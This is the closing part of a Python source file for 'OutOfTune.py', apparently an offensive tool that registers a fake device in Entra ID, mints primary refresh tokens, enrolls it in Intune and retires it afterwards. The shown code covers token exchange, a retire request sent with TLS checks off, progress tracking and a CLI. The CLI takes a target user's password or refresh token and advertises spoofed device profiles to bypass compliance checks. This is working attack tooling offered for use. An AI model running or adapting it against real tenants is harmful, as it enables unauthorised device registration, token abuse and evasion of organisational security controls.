        req_keys.append('uid')
    if not name_override:
        req_keys.append('device_name')
    state = require_state(*req_keys) if req_keys else (load_state() or {})

    pfx_path    = cert_override      or state['pfx_path']
    device_id   = device_id_override or state['device_id']
    device_name = name_override      or state.get('device_name', device_id)
    tenant      = tenant_override    or state['tenant']
    uid         = uid_override       or state['uid']

    if not os.path.exists(pfx_path):
        log.error(f"Device PFX not found: {pfx_path}")
        sys.exit(1)

    log.info(f"Device     : {device_name}")
    log.info(f"Device ID  : {device_id}")
    log.info(f"Device PFX : {pfx_path}")

    # Resolve IWService URLs (same logic as check)
    iwservice_url = getattr(args, 'iw_url', None) or state.get('iw_service_url')
    renewal_url   = getattr(args, 'renewal_url', None) or state.get('iw_renewal_url')
    if not (iwservice_url and renewal_url):
        enrollment_url = state.get('enrollment_url')
        if not enrollment_url:
            log.error("Cannot resolve IWService URLs — no enrollment_url in state")
            log.error("Run mdm-enroll first, or supply --iw-url and --renewal-url")
            sys.exit(1)
        from urllib.parse import urlparse
        parsed = urlparse(enrollment_url)
        base = f"{parsed.scheme}://{parsed.netloc}"
        iwservice_url = base + IW_PATH_SUFFIX
        renewal_url   = base + RENEWAL_PATH_SUFFIX
        log.info(f"IWService URL (derived)  : {iwservice_url}")
        log.info(f"TokenRenewal URL (derived): {renewal_url}")

    log.info("deviceauth() — minting PRT...")
    try:
        if getattr(args, 'refresh_token', None):
            prt, session_key = deviceauth(None, None, args.refresh_token, pfx_path, PROXY)
        else:
            prt, session_key = deviceauth(args.username, args.password, None, pfx_path, PROXY)
    except Exception as e:
        log.error(f"deviceauth() failed: {type(e).__name__}: {e}")
        if DEBUG:
            traceback.print_exc()
        sys.exit(1)
    log.success("PRT obtained")

    log.info(f"prtauth -> enrollment token ({INTUNE_ENROLLMENT_APPID})...")
    result = prtauth(prt, session_key, INTUNE_CLIENT_ID, INTUNE_ENROLLMENT_APPID, None, PROXY)
    if result is None:
        log.error(f"prtauth for {INTUNE_ENROLLMENT_APPID} failed")
        sys.exit(1)
    enrollment_resource_token, _ = result
    log.success("Enrollment resource token obtained")

    log.info("token_renewal -> IWService token...")
    try:
        iw_token = token_renewal_for_enrollment(renewal_url, enrollment_resource_token, PROXY)
    except Exception as e:
        log.error(f"token_renewal_for_enrollment failed: {type(e).__name__}: {e}")
        if DEBUG:
            traceback.print_exc()
        sys.exit(1)
    log.success("IWService token obtained")

    # Query IWService for device record
    log.info(f"GET IWService/Devices  (AadId={device_id})...")
    try:
        resp = requests.get(
            url=_iw_devices_url(iwservice_url),
            headers={"Authorization": f"Bearer {iw_token}"},
            proxies=PROXY,
            verify=False
        )
        resp.raise_for_status()
        devices = resp.json().get('value', [])
    except Exception as e:
        log.error(f"IWService /Devices query failed: {type(e).__name__}: {e}")
        if DEBUG:
            traceback.print_exc()
        sys.exit(1)

    device_record = None
    for d in devices:
        if d.get('AadId') == device_id:
            device_record = d
            break

    if device_record is None:
        log.error(f"Device {device_id} not found in IWService - already retired or not enrolled?")
        sys.exit(1)

    # Corporate device check
    enrollment_type = device_record.get('EnrollmentType')
    if enrollment_type == 18:
        log.error("Device is classified as corporate-owned (EnrollmentType=18)")
        log.error("Intune blocks self-service retirement for corporate devices")
        log.error("Run entra-delete to remove the Entra device object instead")
        sys.exit(1)

    # Get retire action URL
    retire_info = device_record.get('#CommonContainer.Retire') or device_record.get('#CommonContainer.FullWipe')
    if retire_info is None:
        log.error("No retire/wipe action found — device may already be retired")
        sys.exit(1)

    retire_url = retire_info['target']
    log.info(f"Retire URL : {retire_url}")
    log.info("Sending retire...")
    try:
        resp = requests.post(
            url=(f"{retire_url}?api-version=16.4&ssp=WindowsSSP"
                 f"&ssp-version={IW_OS_VERSION}&os=Windows&os-version={IW_OS_VERSION}"
                 f"&os-sub=None&arch=ARM&mgmt-agent=Mdm"),
            headers={"Authorization": f"Bearer {iw_token}"},
            proxies=PROXY,
            verify=False
        )
        if resp.status_code == 204:
            log.success(f"Device {device_name} successfully retired from Intune")
            save_state({'mdm_pfx_path': ''})
        else:
            log.error(f"Retire request returned HTTP {resp.status_code}")
            log.error(resp.text[:400] if resp.text else "(empty response)")
            sys.exit(1)
    except Exception as e:
        log.error(f"Retire request failed: {type(e).__name__}: {e}")
        if DEBUG:
            traceback.print_exc()
        sys.exit(1)

def cmd_status(args):
    log.section("Chain Status")
    if not os.path.exists(STATE_FILE):
        log.warning(f"No state file found ({STATE_FILE}) — no phases have run yet")
        print()
        log.info("Start with: python OutOfTune.py drs-token -u user@blah.com -p Password1!")
        return
    state = load_state()
    checks = [
        ('Phase 1 — DRS token',    'drs_token',    'drs_token'),
        ('Phase 2 — Device join',  'pfx_path',     'pfx_path'),
        ('Phase 3 — Device token', 'device_token', 'device_token'),
        ('Phase 4 — MDM enrolled', 'mdm_pfx_path', 'mdm_pfx_path'),
    ]
    print()
    for label, key, _ in checks:
        val = state.get(key)
        if val:
            short = val[:60] + "..." if len(str(val)) > 60 else str(val)
            print(f"  {'[+]':5s}  {label:30s}  {short}")
        else:
            print(f"  {'[-]':5s}  {label:30s}  (not yet completed)")
    print()
    print("  Saved values:")
    skip_keys = {'drs_token', 'device_token'}
    for k, v in state.items():
        if k in skip_keys:
            print(f"    {k:20s} : [token — {len(v)} chars]")
        else:
            print(f"    {k:20s} : {v}")
    print()
    print("  File artefacts:")
    for key in ('pfx_path', 'mdm_pfx_path'):
        path = state.get(key)
        if path:
            mark = '[+]' if os.path.exists(path) else '[-] MISSING'
            print(f"    {mark:10s}  {path}")
    print()
    if not state.get('drs_token'):
        log.info("Next: python OutOfTune.py drs-token -u user@blah.com -p Password1!")
    elif not state.get('pfx_path'):
        log.info("Next: python OutOfTune.py device-join [-n DEVICENAME]")
    elif not state.get('device_token'):
        log.info("Next: python OutOfTune.py device-token [--cert device.pfx]")
    elif not state.get('mdm_pfx_path'):
        log.info("Next: python OutOfTune.py mdm-enroll [--cert device.pfx] [--profile FILE]")
    else:
        log.info("All phases complete. Run: python OutOfTune.py mdm-checkin [--cert mdm.pfx] [-r <rt>]")


# -------------------------
# Entry point
# -------------------------

_EPILOG = """\
-----------------------------------------------------------------------------
  WINDOWS CHAIN  (Entra device join -> MDM enroll -> checkin)
-----------------------------------------------------------------------------
  drs-token   -u user@eko-tech.co.uk -p Password1!         # ROPC (creds known)
  drs-token   -u user@eko-tech.co.uk -t <drs_token>        # token
  device-join [-n DEVICENAME]
  device-token [--cert device.pfx]
  mdm-enroll  [--cert device.pfx] [--profile FILE]
  mdm-checkin [--cert mdm.pfx]   [--profile FILE] [-r <refresh_token>]

-----------------------------------------------------------------------------
  COMPLIANCE CHECK
-----------------------------------------------------------------------------
  check   -u user@eko-tech.co.uk -r <refresh_token>     # MFA refresh token
  check   -u user@eko-tech.co.uk -p Password1!          # ROPC (may fail CA)

-----------------------------------------------------------------------------
  CLEANUP
-----------------------------------------------------------------------------
  retire-intune  -u user@eko-tech.co.uk -r <refresh_token>
  entra-delete

-----------------------------------------------------------------------------
  DEVICE PROFILE  (spoof hardware/OS attributes to bypass compliance checks)
-----------------------------------------------------------------------------
  --profile <file>    JSON file overriding any subset of device attributes
                      (manufacturer, model, OS version, MAC, HWDevID, etc.)
                      Saved to state after mdm-enroll; reused by mdm-checkin.

  python OutOfTune.py mdm-enroll  --profile profiles/dell_win11_ent.json
  python OutOfTune.py mdm-checkin             # profile reloaded from state

-----------------------------------------------------------------------------
  CERTIFICATE OVERRIDES
-----------------------------------------------------------------------------
  device-token  --cert path/to/device.pfx
  mdm-enroll    --cert path/to/device.pfx
  mdm-checkin   --cert path/to/mdm.pfx
  check         --cert path/to/device.pfx

-----------------------------------------------------------------------------
  GLOBAL OPTIONS  (place before the command)
-----------------------------------------------------------------------------
  --debug          Verbose HTTP + token logging
  --proxy <url>    Route all traffic through a proxy

  python OutOfTune.py --debug device-token
  python OutOfTune.py --proxy http://127.0.0.1:8080 mdm-checkin
"""


def main():
    parser = argparse.ArgumentParser(
        prog='OutOfTune.py',
        description=(
            'State is persisted to chain_state.json.\n'
            "Use 'python OutOfTune.py <command> -h' for per-command help."
        ),
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=_EPILOG,
    )

    parser.add_argument('--debug', action='store_true',
                        help='Enable verbose HTTP request/response and token claim logging')
    parser.add_argument('--proxy', metavar='URL', default=None,
                        help='Proxy URL for all requests  (e.g. http://127.0.0.1:8080)')

    sub = parser.add_subparsers(dest='command', metavar='command')

    p1 = sub.add_parser('drs-token', help='Acquire a DRS access token',
                        formatter_class=argparse.RawDescriptionHelpFormatter)
    p1.add_argument('-u', '--username', required=True, metavar='UPN',
                    help='Target user principal name  (user@domain)')
    p1.add_argument('-p', '--password', metavar='PASS', default=None,
                    help='Password - ROPC auth path')
    p1.add_argument('-t', '--token', dest='access_token', metavar='TOKEN', default=None,
                    help='Pre-obtained DRS access token')
    p1.set_defaults(func=cmd_phase1)

    p2 = sub.add_parser('device-join', help='Entra device join',
                        formatter_class=argparse.RawDescriptionHelpFormatter)
    p2.add_argument('-n', '--name', dest='device_name', metavar='NAME', default=None,
                    help=f'Device hostname to register  (default: {DEFAULT_DEVICE})')
    p2.set_defaults(func=cmd_phase2)

    p3 = sub.add_parser('device-token', help='Acquire device principal token',
                        formatter_class=argparse.RawDescriptionHelpFormatter)
    p3.add_argument('--cert', metavar='FILE', default=None,
                    help='Device PFX path  (default: pfx_path from state)')
    p3.set_defaults(func=cmd_phase3)

    p4 = sub.add_parser('mdm-enroll', help='SOAP discovery + Intune MDM enrollment',
                        formatter_class=argparse.RawDescriptionHelpFormatter)
    p4_adv = p4.add_argument_group('advanced')
    p4_adv.add_argument('--enroll-url', dest='enroll_url', metavar='URL', default=None,
                        help='Override enrollment URL - skips SOAP discovery entirely')
    p4_adv.add_argument('--cert', metavar='FILE', default=None,
                        help='Device PFX path  (default: pfx_path from state)')
    p4_adv.add_argument('--profile', metavar='FILE', default=None,
                        help='JSON device profile - spoofs hardware/OS attributes sent to Intune')
    p4.set_defaults(func=cmd_phase4)

    p5 = sub.add_parser('mdm-checkin',
                        help='OMA-DM checkin - fetch policies and set device primary user',
                        formatter_class=argparse.RawDescriptionHelpFormatter)
    p5.add_argument('--cert', metavar='FILE', default=None,
                    help='MDM PFX path  (default: mdm_pfx_path from state)')
    p5.add_argument('--profile', metavar='FILE', default=None,
                    help='JSON device profile - overrides state profile_path for this checkin')
    p5.add_argument('-r', '--user-rt', dest='user_refresh_token', metavar='RT', default=None,
                    help='User refresh token - exchanged for manage.microsoft.com AT and sent as '
                         'Authorization: Bearer in SyncML.  Sets device primary user so user-scoped '
                         'compliance policies bind.')
    p5.add_argument('--rt-client', dest='rt_client_id', metavar='CLIENT_ID',
                    default=DRS_CLIENT_ID,
                    help=f'Client ID that issued the -r refresh token  '
                    )
    p5.add_argument('-o', '--output', metavar='FILE', default=None,
                    help='Write checkin output (profiles, MSI URLs, ODJ blob) to FILE in addition to stdout')
    p5.set_defaults(func=cmd_phase5)

    pc = sub.add_parser('check', help='Query Intune compliance state for the enrolled device',
                        formatter_class=argparse.RawDescriptionHelpFormatter)
    pc_auth = pc.add_argument_group('auth')
    pc_auth.add_argument('-u', '--username', metavar='UPN')
    pc_auth.add_argument('-p', '--password', metavar='PASS')
    pc_auth.add_argument('-r', '--refresh-token', dest='refresh_token', metavar='RT')
    pc_adv = pc.add_argument_group('advanced')
    pc_adv.add_argument('--cert', metavar='FILE', default=None,
                        help='Device PFX path  (default: pfx_path from state)')
    pc_adv.add_argument('--iw-url', metavar='URL')
    pc_adv.add_argument('--renewal-url', metavar='URL')
    pc.set_defaults(func=cmd_check)

    pd = sub.add_parser('entra-delete', help='Delete device object from Entra ID',
                        formatter_class=argparse.RawDescriptionHelpFormatter)
    pd.add_argument('--cert', metavar='FILE', default=None,
                    help='Device PFX path  (default: pfx_path from state)')
    pd.set_defaults(func=cmd_entra_delete)

    pr = sub.add_parser('retire-intune', help='Retire device from Intune MDM',
                        formatter_class=argparse.RawDescriptionHelpFormatter)
    pr_auth = pr.add_argument_group('auth  (same as check — requires user PRT)')
    pr_auth.add_argument('-u', '--username', metavar='UPN')
    pr_auth.add_argument('-p', '--password', metavar='PASS')
    pr_auth.add_argument('-r', '--refresh-token', dest='refresh_token', metavar='RT',
                         help='MFA-session refresh token')
    pr_adv = pr.add_argument_group('advanced')
    pr_adv.add_argument('--cert', metavar='FILE', default=None,
                        help='Device PFX path  (default: pfx_path from state)')
    pr_adv.add_argument('--device-id', dest='device_id', metavar='UUID', default=None,
                        help='Entra device object ID - overrides state (use when state is missing)')
    pr_adv.add_argument('--tenant', metavar='DOMAIN', default=None,
                        help='Tenant domain - overrides state')
    pr_adv.add_argument('--uid', metavar='UPN_PREFIX', default=None,
                        help='User uid - overrides state')
    pr_adv.add_argument('--name', dest='device_name', metavar='NAME', default=None,
                        help='Device name - overrides state (cosmetic only)')
    pr_adv.add_argument('--iw-url', metavar='URL')
    pr_adv.add_argument('--renewal-url', metavar='URL')
    pr.set_defaults(func=cmd_retire_intune)

    ps = sub.add_parser('status', help='Show chain progress and saved artefacts',
                        formatter_class=argparse.RawDescriptionHelpFormatter)
    ps.set_defaults(func=cmd_status)

    args = parser.parse_args()

    if not args.command:
        parser.print_help()
        sys.exit(0)

    global DEBUG, PROXY
    DEBUG = args.debug
    PROXY = {'http': args.proxy, 'https': args.proxy} if args.proxy else None

    if DEBUG:
        print()
        log.debug("debug on")
        if PROXY:
            log.debug(f"Proxy: {args.proxy}")
        print()

    if args.command == 'mdm-enroll' and hasattr(args, 'enroll_url') and args.enroll_url:
        save_state({'enrollment_url_override': args.enroll_url})
        log.info(f"Enrollment URL override saved: {args.enroll_url}")

    args.func(args)


if __name__ == '__main__':
    main()
